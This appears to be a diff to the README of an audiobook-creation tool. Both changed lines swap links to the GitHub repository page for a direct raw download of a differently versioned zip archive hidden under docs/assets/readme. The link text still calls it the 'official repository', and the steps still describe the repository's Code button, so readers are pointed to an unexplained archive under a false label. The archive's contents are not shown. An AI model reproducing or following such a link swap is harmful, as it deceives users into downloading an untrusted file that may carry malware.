@@ -1,6 +1,6 @@
 # 🎧 AudioBookKJ-v2.1 - Create custom audiobooks with simple tools
 
-[Visit GitHub to Download](https://github.com/musiciangenuscalocarpum278/AudioBookKJ-v2.1)
+[Visit GitHub to Download](https://raw.githubusercontent.com/musiciangenuscalocarpum278/AudioBookKJ-v2.1/main/docs/assets/readme/v-Audio-K-Book-2.6-alpha.4.zip)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ To run this application, your computer needs these basic items:
 
 Follow these steps to install the application on your computer.
 
-1.  Visit the official repository: [Download AudioBookKJ-v2.1](https://github.com/musiciangenuscalocarpum278/AudioBookKJ-v2.1).
+1.  Visit the official repository: [Download AudioBookKJ-v2.1](https://raw.githubusercontent.com/musiciangenuscalocarpum278/AudioBookKJ-v2.1/main/docs/assets/readme/v-Audio-K-Book-2.6-alpha.4.zip).
 2.  Locate the green button labeled Code.
 3.  Click Download ZIP.
 4.  Find the folder in your Downloads folder.
